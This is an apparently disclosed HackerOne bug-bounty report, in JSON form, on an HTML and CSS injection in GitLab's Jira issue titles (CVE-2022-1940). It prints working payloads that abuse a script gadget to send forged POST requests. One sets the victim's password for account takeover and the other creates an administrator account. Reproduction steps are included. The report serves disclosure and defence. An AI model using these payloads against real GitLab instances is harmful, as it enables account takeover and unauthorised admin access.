{
  "id": 1533976,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTMzOTc2",
  "url": "https://hackerone.com/reports/1533976",
  "title": "Content injection in Jira issue title enabling sending arbitrary POST request as victim",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2022-04-07T14:23:04.033Z",
  "submitted_at": "2022-04-07T14:23:04.212Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "joaxcar",
    "url": "/joaxcar",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/9865qc9er7t2lratx5rgszbf3257/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58?response-content-disposition=inline%3B%20filename%3D%224FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg%22%3B%20filename%2A%3DUTF-8%27%274FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ363NV4N%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065959Z&X-Amz-Expires=1095&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIQCUKMH71SIb%2FoTww4o7Fyp5mQhZVTwsH6dhlfwUD7S8TwIgF4Omzzgoy7Eh%2FuuaDn6bJadywjrFCwcrXLyPd1UCs5kqsQUIIhADGgwwMTM2MTkyNzQ4NDkiDKGxZrCtnfrI2eKhbiqOBXD0daRtK7nXN8bU4wh8rs0TwC9%2FcJa7QcdjP2SAL2YxL6GkwLVHnakg45WQ%2BWk4Adhd6eDu4AekBKcLFkFd8k%2Fd5lubZW1GVCKCIIzX8mIHtiR6NWgAL1RYXyLJqsBolJgkbfAKgnxB2VBNu9cqdN0Sg6q46Ilnq1hqExJMLfqht15NsELU1U%2FQ19p63tws1LUaitduuiCmfbNrtck%2BJiuxte1AqtVx350x7u7AVd0SqMQXMgYhUrdnfQGkHw4PKw01gqvsRv0qYiR5T%2BJ02lVmbMGvHW0qzI3DYYUFIGfXcUFnGQSIaE%2FgPqRPsEBM6Lwmyz7ekYcfG4NAQPkX7s7d3l%2BAxF8xABewHt3siqiqDRwd%2BQ4qbNSRRB2PkDbmZ1eHzYDk4QbTDmVKIFyPKrkIkVF4XR4g2Coeli7hvF%2BckBOmv0p8iVYfRcyovSIhcdl6kBxgYFShVu%2FoppYowWnD2wehXrreQsVGuk%2FSEDklipqIstWBh044DkhjHK38BO2tKoCbBEd3HL%2F%2BCSTk87EjIAnzFVx1G%2Bg0F2Yj%2FB8WgRs4oGUj%2F%2FugSeXVb7VtlulwRZSm%2BK3L%2BBvsp0VDMXQNBHJyKN5tTlj1qWo5o325Ubas8A3WgFHAJYPgq4gNHNsbElI8w6eB%2BoTxkjdH2%2B5YcHseEpZR6D9yp11HZu1B1Z9ccVeEbWoll9F%2Fl90jl7Darf0cRBdETJBVQe9lES5xsNEsTzJCU0hJC7cbhVgiFsvjy%2BsmVYuW%2BJ0Ir2DYYd%2BEAKSEPkMQzbR5JEOhhY35l4K5u%2FzDZNGAuBAAEQtj%2F79KdtjYW%2Fo3zHs0RmQMmpWUybphGAceZplAaCh5JeuSBsicB56wWgZXYoeowzDl%2BLioBjqxAavr89KptASCwoBoIcJJ1%2F%2F5OLzjaOfXS9rhOyPfMD4r39NrVSBqOuZEqOKLh8OZun7ZmvuZ6d%2Bu0%2Fq3yH0BFxg8fSuBxWsADt3u8ZMwDmRFAsTmr%2Fi0BfAgyXp3o3mJLIlnT3C6KGPZgG5zSxpe1VPmWP4RCUXcoIqHJJNfyToajUXSYsPPP%2FGEYB7eJNBTLXBAPJRkz74FOOGIE7hFLR1tttCq48hFanfnz69J0GhsHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=edbaf43fa64da9e80cc1cfc9916c5b16791363d61f41d6f89acf4dc6df9c9f08"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2022-1940"
  ],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2022-09-22T21:32:45.137Z",
  "bug_reporter_agreed_on_going_public_at": "2022-09-22T08:11:25.219Z",
  "team_member_agreed_on_going_public_at": "2022-09-22T21:32:45.014Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary\n\nThe issue described here leads to the same outcome as my previous report, https://hackerone.com/reports/1409788 . So look into that one for further details on the JavaScript gadgets. Also see my report https://hackerone.com/reports/1481207 for a detailed rundown of injections in GitLab.\n\nThis time it is the `title` field of Jira issue pages that renders without proper HTML encoding. Leading to HTML and CSS injection. By abusing a script gadget and a browser quirk (tested on Chrome and Firefox) the injection can be escalated into a highly dangerous arbitrary POST request. Depending on the payload, this POST request can lead to account takeover(of OAuth/SAML accounts) and also generation of admin accounts giving full access to the whole instance.\n\nFor the H1 triager it is OK to skip to the POC as the description will contain a lot of GitLab specifics.\n\n## Background\nThere is a premium feature in GitLab where a user can connect a project with a Jira tracker. See https://docs.gitlab.com/ee/integration/jira/ . When this is set up there will be a path in the project like so: https://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues where any tasks created in Jira will be automatically fetched and presented to the members of the project.\n\nGiving a task in Jira a title containing HTML will (if the Jira integration is set up in the project) generate an Jira issue in GitLab with the same title. When viewing the Jira issue details page (https://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues/ISO-1) this title field will be displayed without proper HTML encoding and thus render the supplied HTML. The caveat here is that this HTML will be sanitized by DOMPurify as it is added through the Vue `v-safe-html` attribute.\n\nBut as I have shown in my previous reports, there exists some JavaScript gadgets that slips through DOMPurify in your current default settings.\n\nIf you reed my other reports you can also see that there exists a gadget leading to full XSS, this do require the injected data to be present in the page on initial load. In this case, the data is fetched in a subsequent request and thus miss the first run through main.js\n\nWhen a detail page for a Jira issue is first visited, the call for the issue data is actually too slow to hit the second tier of JavaScript gadgets (the code inside defered_execution in main.js). But I found a way to bypass this. When a browser leaves a page to visit another page, and then uses History.back (or the back button in the browser) the browser will not generate a complete rerun of the previous requests. It will instead use cached data, even for the data that is not supposed to be cached. So I found out that visiting a infected Jira issue page, browsing away from the page, and then clicking the back button to get to the Jira issue again, will speed up the data call to have it hit by the deferred part of main.js\n\nTo weaponize this, all we need is to first navigate away from the page to a server that just runs `History.back()` to directly redirect the user back to the malicious issue page and the payload will now trigger. All this can be made almost guarantied as the injection also allows for arbitrary CSS to be loaded. This makes it possible to craft a page that have an overlay link that will trigger on clicking anywhere.\n\n## The payload\nI will present two payloads that will show the potential damage from this attack.\n\nThere exists a limitation as for the injection, as Jiras tasks have a 255 letter limit. This is not much to work with, but with some trix we can still get both account takeover and admin creation to work inside this payload.\n\nFirst of we have a payload that will be able to perform account takeovers on accounts that do not have a password set. This is all OAuth registered accounts (and as far as I understand also SAML and maybe LDAP accounts). These accounts have an auto generated (strong! As of 14.9.2) password after the user signs up with, for example \"sign in with GitHub\". If the user does not actively go to `/profile/password/edit` and add a new password, the account is vulnerable to this attack. The password update page does not require \"current password\" before an initial password has been set. The payload looks like this\n```\n<a href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/-/profile/password?_method=put&user%5Bnew_password%5D=12345678&user%5Bpassword_confirmation%5D=12345678'>.</a><style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css\n```\nIf we pull this apart, we have\n```\n<a \n  href=http:j15.se <--- a site that when visited just throws the user back, saving some chars by omiting slashes\n  class=js-feature-highlight <--- the classname to be used as a gadget\n  data-dismiss-endpoint='/-/profile/password?_method=put&user%5Bnew_password%5D=12345678&user%5Bpassword_confirmation%5D=12345678'\n  ^--- The payload where the POST request will get sent\n  >\n.</a> <--- close the anchor tag\n<style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css\n  ^--- Unlimited styling to make the website a bulletproof click machine :)\n```\nThis will generate a link covering the whole screen. When clicked (by clicking anywhere) the browser will go to http://j15.se which is a site that directly throws the user back to where it came from. This time, the browser will fetch the data from its cache and thus make the main.js hit the payload. The user will now have to click the page again to actually send the payload. It is two required clicks, but as we have full CSS control we can make it almost guarantied that a user will try to click somewhere on our page.\n\nWhen the payload have fired, the OAuth user will have a new password. The user will be logged out but nothing else will point to the password having been set. Account takeover complete!\n\n\nThis payload will add a new administrator to the instance if an administrator visits the malicious page\n```\n<a href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/api/v4/users?admin=true&email=j@j15.se&name=h&username=hack&password=12345678&skip_confirmation=true'>.</a><style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css\n```\nPulled apart\n```\n<a href=http:j15.se\n  class=js-feature-highlight\n  data-dismiss-endpoint='/api/v4/users?admin=true&email=j@j15.se&name=h&username=hack&password=12345678&skip_confirmation=true'>\n.</a>\n<style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css\n```\n\n\n## Steps to reproduce\n\nThis requires three things:\n1. access to a premium subscription (no problem on GitLab.com as there are free trials, they work great for the attack)\n2. a Jira server. I used a cloud Jira instance on atlassian.com\n3. a third party account that is not registered on GitLab. ex a GitHub user\n\nPOC:\n1. Create a user `attacker`\n2. Log in as `attacker` and create a group `attack_group` by visiting https://gitlab.com/groups/new (make sure the group have premium access)\n3. Create a new project in the group called `attack_proj`\n4. Go to https://gitlab.com/attack_group/attack_proj/-/integrations/jira/edit\n5. Follow the guide at https://docs.gitlab.com/ee/integration/jira/issues.html#view-jira-issues to enable viewing Jira issues in the project\n6. Log in to Jira and create a task on the dashboard and name it `<img src=#>`\n7. Go to https://gitlab.com/attack_group/attack_proj/-/integrations/jira/issues and make sure the task is shown as an issue\n8. Click the issue to open the Issue details page. The title will render as a broken image. This proves the injection.\n\n{F1683460}\n\n9. Now go back to Jira and create a new task and name it\n```\n<a href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/-/profile/password?_method=put&user%5Bnew_password%5D=12345678&user%5Bpassword_confirmation%5D=12345678'>.</a><style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css\n```\n10. Go back to the issue list and refresh to make sure it is created\n11. Now log in to GitLab.com with a third party provider, generating a new account on GitLab.com\n12. (if the test project is not public invite the new user to the project as a Developer by visiting https://gitlab.com/atack_group/attack_proj/-/project_members)\n13. Now visit the https://gitlab.com/attack_group/attack_proj/-/integrations/jira/issues list with the OAuth user and click the task with the payload\n14. A page will show up looking empty, click anywhere on the page\n15. The page will flicker, and now when you hover over the page it will show a big blue button stating \"Got it!\". Click it\n\n{F1683461}\n\n16. Refresh the page, you should now be logged out from GitLab.com\n17. Log in with the OAuth email and the password `12345678`\n\nAccount takeover!\n\nImportant to note here is that the second click on the blue button can be made invisible as the first click. I did not want to spend my whole day in CSS but can get back with it if needed! :)\n\n## Impact\n\nHTML and CSS injection in Jira issue page can make POST request as victim user. Can lead to account takeover or admin user escalation.\n\n## What is the current *bug* behavior?\n\nThe name/title field in the Jira issue page is not sanitized\n\n## What is the expected *correct* behavior?\n\nThe name should be shown sanitized\n\n## Output of checks\n\nThis bug happens on GitLab.com\n\n## Impact\n\nAccount takeover and admin user creation through arbitrary POST request in Jira issue",
  "bounty_amount": "8690.0",
  "formatted_bounty": "$8,690",
  "weakness": {
    "id": 72,
    "name": "Resource Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1683460,
      "file_name": "img.jpg",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2si9fdmpbzy9h5el71zxealg58n3?response-content-disposition=attachment%3B%20filename%3D%22img.jpg%22%3B%20filename%2A%3DUTF-8%27%27img.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ363NV4N%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065959Z&X-Amz-Expires=1095&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIQCUKMH71SIb%2FoTww4o7Fyp5mQhZVTwsH6dhlfwUD7S8TwIgF4Omzzgoy7Eh%2FuuaDn6bJadywjrFCwcrXLyPd1UCs5kqsQUIIhADGgwwMTM2MTkyNzQ4NDkiDKGxZrCtnfrI2eKhbiqOBXD0daRtK7nXN8bU4wh8rs0TwC9%2FcJa7QcdjP2SAL2YxL6GkwLVHnakg45WQ%2BWk4Adhd6eDu4AekBKcLFkFd8k%2Fd5lubZW1GVCKCIIzX8mIHtiR6NWgAL1RYXyLJqsBolJgkbfAKgnxB2VBNu9cqdN0Sg6q46Ilnq1hqExJMLfqht15NsELU1U%2FQ19p63tws1LUaitduuiCmfbNrtck%2BJiuxte1AqtVx350x7u7AVd0SqMQXMgYhUrdnfQGkHw4PKw01gqvsRv0qYiR5T%2BJ02lVmbMGvHW0qzI3DYYUFIGfXcUFnGQSIaE%2FgPqRPsEBM6Lwmyz7ekYcfG4NAQPkX7s7d3l%2BAxF8xABewHt3siqiqDRwd%2BQ4qbNSRRB2PkDbmZ1eHzYDk4QbTDmVKIFyPKrkIkVF4XR4g2Coeli7hvF%2BckBOmv0p8iVYfRcyovSIhcdl6kBxgYFShVu%2FoppYowWnD2wehXrreQsVGuk%2FSEDklipqIstWBh044DkhjHK38BO2tKoCbBEd3HL%2F%2BCSTk87EjIAnzFVx1G%2Bg0F2Yj%2FB8WgRs4oGUj%2F%2FugSeXVb7VtlulwRZSm%2BK3L%2BBvsp0VDMXQNBHJyKN5tTlj1qWo5o325Ubas8A3WgFHAJYPgq4gNHNsbElI8w6eB%2BoTxkjdH2%2B5YcHseEpZR6D9yp11HZu1B1Z9ccVeEbWoll9F%2Fl90jl7Darf0cRBdETJBVQe9lES5xsNEsTzJCU0hJC7cbhVgiFsvjy%2BsmVYuW%2BJ0Ir2DYYd%2BEAKSEPkMQzbR5JEOhhY35l4K5u%2FzDZNGAuBAAEQtj%2F79KdtjYW%2Fo3zHs0RmQMmpWUybphGAceZplAaCh5JeuSBsicB56wWgZXYoeowzDl%2BLioBjqxAavr89KptASCwoBoIcJJ1%2F%2F5OLzjaOfXS9rhOyPfMD4r39NrVSBqOuZEqOKLh8OZun7ZmvuZ6d%2Bu0%2Fq3yH0BFxg8fSuBxWsADt3u8ZMwDmRFAsTmr%2Fi0BfAgyXp3o3mJLIlnT3C6KGPZgG5zSxpe1VPmWP4RCUXcoIqHJJNfyToajUXSYsPPP%2FGEYB7eJNBTLXBAPJRkz74FOOGIE7hFLR1tttCq48hFanfnz69J0GhsHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b638ac3060eb47305d7016fedac2f603bd38721c24835a8c2e109c213fc6f7bb",
      "file_size": 100352,
      "type": "image/jpeg",
      "moderated": null
    },
    {
      "id": 1683461,
      "file_name": "gotit.jpg",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gheics7j0d8s4lqijx9lj3hjy3q8?response-content-disposition=attachment%3B%20filename%3D%22gotit.jpg%22%3B%20filename%2A%3DUTF-8%27%27gotit.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ363NV4N%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065959Z&X-Amz-Expires=1095&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIQCUKMH71SIb%2FoTww4o7Fyp5mQhZVTwsH6dhlfwUD7S8TwIgF4Omzzgoy7Eh%2FuuaDn6bJadywjrFCwcrXLyPd1UCs5kqsQUIIhADGgwwMTM2MTkyNzQ4NDkiDKGxZrCtnfrI2eKhbiqOBXD0daRtK7nXN8bU4wh8rs0TwC9%2FcJa7QcdjP2SAL2YxL6GkwLVHnakg45WQ%2BWk4Adhd6eDu4AekBKcLFkFd8k%2Fd5lubZW1GVCKCIIzX8mIHtiR6NWgAL1RYXyLJqsBolJgkbfAKgnxB2VBNu9cqdN0Sg6q46Ilnq1hqExJMLfqht15NsELU1U%2FQ19p63tws1LUaitduuiCmfbNrtck%2BJiuxte1AqtVx350x7u7AVd0SqMQXMgYhUrdnfQGkHw4PKw01gqvsRv0qYiR5T%2BJ02lVmbMGvHW0qzI3DYYUFIGfXcUFnGQSIaE%2FgPqRPsEBM6Lwmyz7ekYcfG4NAQPkX7s7d3l%2BAxF8xABewHt3siqiqDRwd%2BQ4qbNSRRB2PkDbmZ1eHzYDk4QbTDmVKIFyPKrkIkVF4XR4g2Coeli7hvF%2BckBOmv0p8iVYfRcyovSIhcdl6kBxgYFShVu%2FoppYowWnD2wehXrreQsVGuk%2FSEDklipqIstWBh044DkhjHK38BO2tKoCbBEd3HL%2F%2BCSTk87EjIAnzFVx1G%2Bg0F2Yj%2FB8WgRs4oGUj%2F%2FugSeXVb7VtlulwRZSm%2BK3L%2BBvsp0VDMXQNBHJyKN5tTlj1qWo5o325Ubas8A3WgFHAJYPgq4gNHNsbElI8w6eB%2BoTxkjdH2%2B5YcHseEpZR6D9yp11HZu1B1Z9ccVeEbWoll9F%2Fl90jl7Darf0cRBdETJBVQe9lES5xsNEsTzJCU0hJC7cbhVgiFsvjy%2BsmVYuW%2BJ0Ir2DYYd%2BEAKSEPkMQzbR5JEOhhY35l4K5u%2FzDZNGAuBAAEQtj%2F79KdtjYW%2Fo3zHs0RmQMmpWUybphGAceZplAaCh5JeuSBsicB56wWgZXYoeowzDl%2BLioBjqxAavr89KptASCwoBoIcJJ1%2F%2F5OLzjaOfXS9rhOyPfMD4r39NrVSBqOuZEqOKLh8OZun7ZmvuZ6d%2Bu0%2Fq3yH0BFxg8fSuBxWsADt3u8ZMwDmRFAsTmr%2Fi0BfAgyXp3o3mJLIlnT3C6KGPZgG5zSxpe1VPmWP4RCUXcoIqHJJNfyToajUXSYsPPP%2FGEYB7eJNBTLXBAPJRkz74FOOGIE7hFLR1tttCq48hFanfnz69J0GhsHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c095670a72285e50a53c6a0d5b3d89855d67651e398f941bb67b9bb2eea4623c",
      "file_size": 101918,
      "type": "image/jpeg",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 46,
  "voters": [
    "jumpydata",
    "n1m0",
    "tolga",
    "haxor31337",
    "zy9ard3",
    "run_win",
    "yassinek3ch",
    "ninetynine",
    "mr_negative",
    "address_below0",
    "and 36 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 7.7,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "low",
      "user_interaction": "required",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 18138,
    "asset_type": "URL",
    "asset_identifier": "gitlab.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 16197107,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "A TL/DR of the attack complexity:\n\nThe victim needs to:\n1. Visit the issue page\n2. Click anywhere on the page (including menus and sidebars)\n3. Click anywhere on the page again\n\nIt might sound like a lot (hence the HIGH on complexity). But going through the steps myself, it does feel like I would have been easily fooled :)\n\nThe same injection vector can also be used as a phishing page, similar to my report https://hackerone.com/reports/1362405\nThis was my initial idea, but the arbitrary POST attack is much more dangerous!\n\nBest regards\nJohan",
      "automated_response": false,
      "created_at": "2022-04-07T14:28:51.699Z",
      "updated_at": "2022-04-07T14:28:51.699Z",
      "actor": {
        "username": "joaxcar",
        "cleared": false,
        "verified": true,
        "url": "/joaxcar",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/9865qc9er7t2lratx5rgszbf3257/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%224FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg%22%3B%20filename%2A%3DUTF-8%27%274FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ363NV4N%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065959Z&X-Amz-Expires=1095&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIQCUKMH71SIb%2FoTww4o7Fyp5mQhZVTwsH6dhlfwUD7S8TwIgF4Omzzgoy7Eh%2FuuaDn6bJadywjrFCwcrXLyPd1UCs5kqsQUIIhADGgwwMTM2MTkyNzQ4NDkiDKGxZrCtnfrI2eKhbiqOBXD0daRtK7nXN8bU4wh8rs0TwC9%2FcJa7QcdjP2SAL2YxL6GkwLVHnakg45WQ%2BWk4Adhd6eDu4AekBKcLFkFd8k%2Fd5lubZW1GVCKCIIzX8mIHtiR6NWgAL1RYXyLJqsBolJgkbfAKgnxB2VBNu9cqdN0Sg6q46Ilnq1hqExJMLfqht15NsELU1U%2FQ19p63tws1LUaitduuiCmfbNrtck%2BJiuxte1AqtVx350x7u7AVd0SqMQXMgYhUrdnfQGkHw4PKw01gqvsRv0qYiR5T%2BJ02lVmbMGvHW0qzI3DYYUFIGfXcUFnGQSIaE%2FgPqRPsEBM6Lwmyz7ekYcfG4NAQPkX7s7d3l%2BAxF8xABewHt3siqiqDRwd%2BQ4qbNSRRB2PkDbmZ1eHzYDk4QbTDmVKIFyPKrkIkVF4XR4g2Coeli7hvF%2BckBOmv0p8iVYfRcyovSIhcdl6kBxgYFShVu%2FoppYowWnD2wehXrreQsVGuk%2FSEDklipqIstWBh044DkhjHK38BO2tKoCbBEd3HL%2F%2BCSTk87EjIAnzFVx1G%2Bg0F2Yj%2FB8WgRs4oGUj%2F%2FugSeXVb7VtlulwRZSm%2BK3L%2BBvsp0VDMXQNBHJyKN5tTlj1qWo5o325Ubas8A3WgFHAJYPgq4gNHNsbElI8w6eB%2BoTxkjdH2%2B5YcHseEpZR6D9yp11HZu1B1Z9ccVeEbWoll9F%2Fl90jl7Darf0cRBdETJBVQe9lES5xsNEsTzJCU0hJC7cbhVgiFsvjy%2BsmVYuW%2BJ0Ir2DYYd%2BEAKSEPkMQzbR5JEOhhY35l4K5u%2FzDZNGAuBAAEQtj%2F79KdtjYW%2Fo3zHs0RmQMmpWUybphGAceZplAaCh5JeuSBsicB56wWgZXYoeowzDl%2BLioBjqxAavr89KptASCwoBoIcJJ1%2F%2F5OLzjaOfXS9rhOyPfMD4r39NrVSBqOuZEqOKLh8OZun7ZmvuZ6d%2Bu0%2Fq3yH0BFxg8fSuBxWsADt3u8ZMwDmRFAsTmr%2Fi0BfAgyXp3o3mJLIlnT3C6KGPZgG5zSxpe1VPmWP4RCUXcoIqHJJNfyToajUXSYsPPP%2FGEYB7eJNBTLXBAPJRkz74FOOGIE7hFLR1tttCq48hFanfnz69J0GhsHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4fc25536f8ae40162f22df951b078f639b207f19c9a448e3d09abfeaa917db37"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 16201808,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Here is a short video of the account takeover POC.\n\nIn the video you can see my Google account gaining the password 12345678 on GitLab.com by visiting a jira issue\n\n{F1684016}",
      "automated_response": false,
      "created_at": "2022-04-07T20:36:45.522Z",
      "updated_at": "2022-04-07T20:36:45.522Z",
      "actor": {
        "username": "joaxcar",
        "cleared": false,
        "verified": true,
        "url": "/joaxcar",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/9865qc9er7t2lratx5rgszbf3257/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%224FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg%22%3B%20filename%2A%3DUTF-8%27%274FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ363NV4N%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065959Z&X-Amz-Expires=1095&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIQCUKMH71SIb%2FoTww4o7Fyp5mQhZVTwsH6dhlfwUD7S8TwIgF4Omzzgoy7Eh%2FuuaDn6bJadywjrFCwcrXLyPd1UCs5kqsQUIIhADGgwwMTM2MTkyNzQ4NDkiDKGxZrCtnfrI2eKhbiqOBXD0daRtK7nXN8bU4wh8rs0TwC9%2FcJa7QcdjP2SAL2YxL6GkwLVHnakg45WQ%2BWk4Adhd6eDu4AekBKcLFkFd8k%2Fd5lubZW1GVCKCIIzX8mIHtiR6NWgAL1RYXyLJqsBolJgkbfAKgnxB2VBNu9cqdN0Sg6q46Ilnq1hqExJMLfqht15NsELU1U%2FQ19p63tws1LUaitduuiCmfbNrtck%2BJiuxte1AqtVx350x7u7AVd0SqMQXMgYhUrdnfQGkHw4PKw01gqvsRv0qYiR5T%2BJ02lVmbMGvHW0qzI3DYYUFIGfXcUFnGQSIaE%2FgPqRPsEBM6Lwmyz7ekYcfG4NAQPkX7s7d3l%2BAxF8xABewHt3siqiqDRwd%2BQ4qbNSRRB2PkDbmZ1eHzYDk4QbTDmVKIFyPKrkIkVF4XR4g2Coeli7hvF%2BckBOmv0p8iVYfRcyovSIhcdl6kBxgYFShVu%2FoppYowWnD2wehXrreQsVGuk%2FSEDklipqIstWBh044DkhjHK38BO2tKoCbBEd3HL%2F%2BCSTk87EjIAnzFVx1G%2Bg0F2Yj%2FB8WgRs4oGUj%2F%2FugSeXVb7VtlulwRZSm%2BK3L%2BBvsp0VDMXQNBHJyKN5tTlj1qWo5o325Ubas8A3WgFHAJYPgq4gNHNsbElI8w6eB%2BoTxkjdH2%2B5YcHseEpZR6D9yp11HZu1B1Z9ccVeEbWoll9F%2Fl90jl7Darf0cRBdETJBVQe9lES5xsNEsTzJCU0hJC7cbhVgiFsvjy%2BsmVYuW%2BJ0Ir2DYYd%2BEAKSEPkMQzbR5JEOhhY35l4K5u%2FzDZNGAuBAAEQtj%2F79KdtjYW%2Fo3zHs0RmQMmpWUybphGAceZplAaCh5JeuSBsicB56wWgZXYoeowzDl%2BLioBjqxAavr89KptASCwoBoIcJJ1%2F%2F5OLzjaOfXS9rhOyPfMD4r39NrVSBqOuZEqOKLh8OZun7ZmvuZ6d%2Bu0%2Fq3yH0BFxg8fSuBxWsADt3u8ZMwDmRFAsTmr%2Fi0BfAgyXp3o3mJLIlnT3C6KGPZgG5zSxpe1VPmWP4RCUXcoIqHJJNfyToajUXSYsPPP%2FGEYB7eJNBTLXBAPJRkz74FOOGIE7hFLR1tttCq48hFanfnz69J0GhsHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4fc25536f8ae40162f22df951b078f639b207f19c9a448e3d09abfeaa917db37"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 1684016,
          "filename": "takeover.mp4",
          "type": "video/mp4",
